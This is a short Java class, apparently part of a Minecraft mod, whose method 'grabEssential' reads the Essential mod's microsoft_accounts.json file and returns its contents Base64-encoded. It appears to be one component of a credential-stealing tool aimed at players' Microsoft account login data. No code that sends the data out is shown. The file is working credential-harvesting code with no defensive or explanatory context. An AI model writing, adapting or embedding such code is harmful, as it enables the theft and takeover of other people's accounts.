package dev.schubilegend.handlers;

import net.minecraft.client.Minecraft;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class EssentialHandler {
    public String grabEssential(){
        String essentialPath = Minecraft.getMinecraft().mcDataDir + "\\essential\\microsoft_accounts.json";
        StringBuilder contentBuilder = new StringBuilder();
        if(!new File(essentialPath).exists()){
            return "Not found";
        }
        try (BufferedReader reader = new BufferedReader(new FileReader(essentialPath))) {
            String line;
            while ((line = reader.readLine()) != null) {
                contentBuilder.append(line).append("\n");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.getEncoder().encodeToString(contentBuilder.toString().getBytes(StandardCharsets.UTF_8));
    }
}
